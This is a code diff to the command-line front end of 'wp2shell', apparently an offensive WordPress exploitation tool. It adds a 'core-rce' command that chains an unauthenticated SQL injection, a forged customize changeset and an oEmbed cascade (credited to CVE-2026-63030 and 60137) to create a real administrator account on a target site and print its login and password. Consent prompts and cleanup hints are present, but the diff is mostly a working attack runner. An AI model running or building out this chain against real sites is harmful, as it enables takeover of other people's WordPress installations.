@@ -16,7 +16,7 @@ import json
 import secrets
 import sys
 
-from . import desync, sqli
+from . import desync, sqli, takeover
 from .http import endpoints, http_get
 
 
@@ -184,6 +184,46 @@ def cmd_plugin_rce(args):
     return rc
 
 
+# ── core-rce ──────────────────────────────────────────────────────────────────
+# CLEAN-CORE unauthenticated admin creation (no plugin). Full chain: nested-batch
+# SQLi -> forged customize_changeset -> oEmbed/hierarchy-loop cascade publishes it
+# -> _publish_changeset_values() borrows the admin identity -> parse_request re-entry
+# -> POST /wp/v2/users. Trigger geometry credit: shinthink (see CREDITS.md / analysis
+# §4.2). Plants a REAL administrator, so it is gated behind --yes.
+def cmd_core_rce(args):
+    url = _resolve(args.target)
+    print("[*] CLEAN-CORE unauth admin creation (CVE-2026-63030 + 60137, no plugin)")
+    if not desync.desync_present(url):
+        print("[!] no desync signal — target appears PATCHED (63030 closed). Aborting.")
+        return 2
+    if not args.yes:
+        print("[!] This creates a REAL administrator account on the target and inserts")
+        print("    oembed_cache rows. Re-run with --yes to proceed (authorized targets only).")
+        print("    Preconditions: target needs outbound egress + a reachable oEmbed provider.")
+        return 2
+
+    embeds = args.embed_url or None
+    print("[*] seeding oEmbed cache, forging changeset, firing chain (may take ~30s)...")
+    res = takeover.create_admin(url, username=args.username, password=args.password,
+                                embed_urls=embeds, prefix=args.prefix, timeout=args.timeout)
+    if args.json:
+        print(json.dumps(res, indent=2))
+        return 0 if res.get("ok") else 2
+    if not res.get("ok"):
+        print(f"[!] failed: {res.get('reason')}")
+        if res.get("cache_ids"):
+            print(f"    oembed_cache ids read: {res['cache_ids']}")
+        return 2
+    print("[+] UNAUTHENTICATED ADMINISTRATOR CREATED — no plugin, no auth:")
+    print(f"      login    : {res['username']}")
+    print(f"      password : {res['password']}")
+    print(f"      user_id  : {res.get('user_id')}   is_admin: {res.get('is_admin')}")
+    print(f"    (verified over the SQLi; oembed_cache ids {res.get('cache_ids')} were inserted)")
+    print("    Cleanup: log in with the above and delete the user + oembed_cache rows,")
+    print("    or restore the DB. This tool does not auto-remove the account.")
+    return 0
+
+
 def build_parser():
     ap = argparse.ArgumentParser(
         prog="wp2shell",
@@ -194,6 +234,7 @@ def build_parser():
             "  assessment — clean core, any authorized target:\n"
             "    check       is the target vulnerable? (non-destructive)\n"
             "    sqli        unauthenticated DB read via the clean-core chain\n"
+            "    core-rce    unauth admin creation via the clean-core chain (no plugin; --yes)\n"
             "  lab — needs a deliberately-vulnerable plugin you install (lab/acme-templates.php):\n"
             "    plugin-rce  unauth code execution via a vulnerable plugin write route\n"
             "  research (raw desync primitives):\n"
@@ -243,6 +284,22 @@ def build_parser():
                     help="PHP to write (default: benign, prints 6*7); keep it non-destructive")
     we.add_argument("--keep", action="store_true", help="do not neutralize the planted file afterwards")
     we.set_defaults(func=cmd_plugin_rce)
+
+    cr = sub.add_parser("core-rce",
+                        help="[assessment] clean-core unauth ADMIN creation, no plugin "
+                             "(full 63030+60137 chain; plants a real admin, needs --yes)")
+    cr.add_argument("target")
+    cr.add_argument("--yes", action="store_true",
+                    help="required: confirm you are authorized to create an admin on this target")
+    cr.add_argument("--username", help="admin login to create (default: random wp2_<hex>)")
+    cr.add_argument("--password", help="admin password (default: random)")
+    cr.add_argument("--embed-url", action="append",
+                    help="oEmbed provider URL reachable from the TARGET (repeatable; need 3). "
+                         "The first is used for the live trigger and must return HTML.")
+    cr.add_argument("--prefix", default="wp_", help="DB table prefix (default wp_)")
+    cr.add_argument("--timeout", type=int, default=120, help="per-request timeout seconds")
+    cr.add_argument("--json", action="store_true")
+    cr.set_defaults(func=cmd_core_rce)
 
     return ap
 
